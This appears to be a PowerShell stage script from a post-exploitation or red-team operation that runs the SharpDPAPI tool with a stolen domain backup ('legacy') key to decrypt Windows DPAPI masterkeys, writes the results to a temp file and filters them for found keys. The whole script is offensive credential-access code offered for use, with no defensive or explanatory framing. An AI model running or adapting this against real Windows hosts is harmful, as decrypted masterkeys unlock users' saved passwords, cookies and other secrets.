# 3.5G step2b payload: SharpDPAPI masterkeys with legacy key (file, then base64)
$ErrorActionPreference = 'Continue'
$sdp = 'C:\Windows\Temp\cadre-tools\SharpDPAPI.exe'
$legacy = 'C:\Windows\Temp\cadre-tools\cadre-legacy.key'
$o = 'C:\Windows\Temp\sharpdpapi-out2.txt'

if (Test-Path $legacy) {
    Write-Output "LEGACY_PRESENT $((Get-Item $legacy).Length)"
    Remove-Item $o -ErrorAction SilentlyContinue
    # try file path first
    & $sdp masterkeys /pvk:$legacy > $o 2>&1
    Start-Sleep -Seconds 2
    Write-Output "OUT_SIZE_FILE $((Get-Item $o -ErrorAction SilentlyContinue).Length)"
    Get-Content $o -ErrorAction SilentlyContinue | Select-String -Pattern 'Found MasterKey|decryption|master key cache|\{|Error|Action|Preferred' | Select-Object -First 40 | ForEach-Object { Write-Output "SDPF|$($_.Line)" }
}
Write-Output '3.5G_STEP2B_DONE'
